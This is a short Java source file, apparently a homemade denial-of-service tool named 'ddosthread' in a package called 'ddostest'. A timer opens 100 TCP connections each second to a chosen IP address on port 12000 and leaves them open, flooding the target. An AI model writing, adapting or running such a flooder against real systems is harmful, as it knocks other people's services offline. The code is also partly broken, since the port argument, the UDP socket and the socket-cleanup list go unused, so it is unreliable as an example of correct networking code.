package ddostest;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;


public class ddosthread extends Thread {

        byte[] buffer = {10,23,12,31,43,32,24};
        byte [] IP={-64,-88,1,106};
        int port=57;
        DatagramSocket datagramSocket;
        DatagramPacket packet;
        Timer senderTimer;
        long frekvencia = 1;
        int count=0;
        int ThreadID;
        List<Socket> sockets = new ArrayList<Socket>();
		Socket s = new Socket();
        String param = null;

        public ddosthread(int id, byte[] buff, byte[] ip, int port, long frekvencia) {
            this.ThreadID=id;
            this.IP = ip;
            this.buffer=buff;
            this.port=port;
            this.frekvencia=frekvencia;
            try {
                this.datagramSocket = new DatagramSocket();
            } catch (SocketException ex) {
                Logger.getLogger(View.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        @Override
        public void run() {
                try {
                    sendIT();
                } catch (Exception e) {
                }
        }
        
        public void stopIT(){
            try {
                for (int i = 0; i < sockets.size(); i++) {
                sockets.get(i).close();
               sockets.clear();
                    
                }
            } catch (IOException ex) {
                Logger.getLogger(ddosthread.class.getName()).log(Level.SEVERE, null, ex);
            }
            senderTimer.cancel();
            senderTimer = new Timer();
        }

        public void sendIT() throws Exception {
            senderTimer = new Timer();
        InetAddress address = InetAddress.getByAddress(IP);
            senderTimer.scheduleAtFixedRate(new TimerTask() {
  @Override
  public void run() {
      try {
          for (int i = 0; i < 100; i++) {              
          Socket s = new Socket(); 
          s.connect(new InetSocketAddress(address, 12000), 1000);
          }
						} catch (IOException ex) {
					}
				}
			}, 300, 1000);        
		}
    }
